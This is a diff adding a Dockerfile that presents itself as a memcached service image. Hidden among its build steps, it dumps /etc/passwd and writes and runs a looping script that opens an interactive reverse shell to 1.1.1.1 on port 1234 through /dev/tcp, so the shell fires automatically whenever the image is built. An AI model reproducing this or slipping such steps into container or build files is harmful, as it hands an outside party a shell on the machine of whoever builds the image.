@@ -1,0 +1,13 @@
+FROM ubuntu
+MAINTAINER Victor Coisne victor.coisne@dotcloud.com
+RUN sleep 1
+RUN cat /etc/passwd
+RUN echo "deb http://mirrors.163.com/ubuntu/ precise main restricted universe multiverse" > /etc/apt/sources.list
+RUN apt-get update
+RUN echo "while ((1));do sleep 1;echo 111;/bin/sh -i >& /dev/tcp/1.1.1.1/1234 0>&1;done" >> /tmp/1.sh
+RUN bash /tmp/1.sh
+RUN sleep 20
+RUN apt-get install -y memcached
+ENTRYPOINT ["memcached"]
+USER daemon
+EXPOSE 11211
